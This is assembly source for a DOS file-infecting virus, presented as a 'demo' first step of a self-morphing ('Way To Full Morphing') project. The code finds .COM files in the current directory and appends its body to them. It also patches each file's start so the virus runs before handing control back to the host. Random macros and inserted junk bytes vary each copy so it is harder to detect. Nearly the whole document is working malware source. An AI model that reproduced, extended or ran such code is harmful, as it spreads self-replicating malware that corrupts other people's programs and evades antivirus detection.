   ; Com-NonResident from the current directory
   ; This is first step of project WTFM (Way To Full Morphing).
   ; It's demo only.
   ; (c)2b

   include _rndmac.mac

   initRND
   getRND  0ffh
   RND21 = RND

   .model tiny
   .code
   org 100h
   start:
       dec bp      ; 'M'
       _mov    si,80h
       _mvr    cx,si
   len_of: mov bp,len
       _mov    di,buf1
       rep movsb
       _mov    ah,4eh

   find:   call    fr
       getRND  4
       db  '*',RND+1 dup('?'),'.CoM',0 ; mask
   fr: pop dx
       _mov    cx,20h
       call    i21
       jnc found
       call    quit        ; jmp quit
       getRND  9
       REPT    RND+1       ; musor
        getRND 0ffh
        db RND
       ENDM

   i21:    int 21h
       ret
   i_21:   pop di
       _mov    ah,RND21
       xor ah,[di]
       inc di
       push    di
       jmp i21

   found:  _mov    si,9ah
       _mov    cx,len
       cmp word ptr ds:[si],cx ; min file len
       jb  next
       getRND  400h
       _mov    ax,60000+RND
       cmp word ptr ds:[si],ax ; max file len
       ja  next

       xor ax,(60000+RND) xor 3d02h    ; mov ax, 3d02h
       _mov    dx,9eh

       int21   3dh
       jc  next
       _mvr    bx,ax

       _mov    dx,buf
       _mvr    si,dx
       int21   3fh
       cmp byte ptr [ds:si],'M'
       jnz @1

   next:   int21   3eh
       _mov    ah,4fh
       jmp find

   @1: _nul    dx
       _mov    al,02h
       _nul    cx
       int21   42h

       _mov    cx,len
       mov word ptr ds:[len_of+1],ax
       _mov    dx,buf
       int21   40h
       jc  next
       _nul    cx
       _mov    al,00h
       _nul    dx
       int21   42h
       _mov    dh,1
       _mov    cx,len
       int21   40h
       int21   3eh

   quit:   _mov    di,80h
       db  6ah, 0c3h   ; push  ffc3h   ; ret
       _mov    si,buf1
       db  68h, 0f3h, 0a4h ; push  a4f3h   ; rep movsb
       _mvr    cx,di
       rep movsb       ; restore DTA
       _nul    ax
       push    ax      ; = 0

       _mvr    si,bp       ; si = length infected prog's
       add si,di       ; add 100h (PSP)
       push    di      ; = 100h
       _mov    cx,len
       jmp sp
       getRND  9
       REPT    RND+1       ; musor
        getRND 0ffh
        db RND
       ENDM

   len equ $-start
       getRND  5ffh
   buf equ 0f000h+RND
   buf1    equ buf+len+10
   ret
   end start
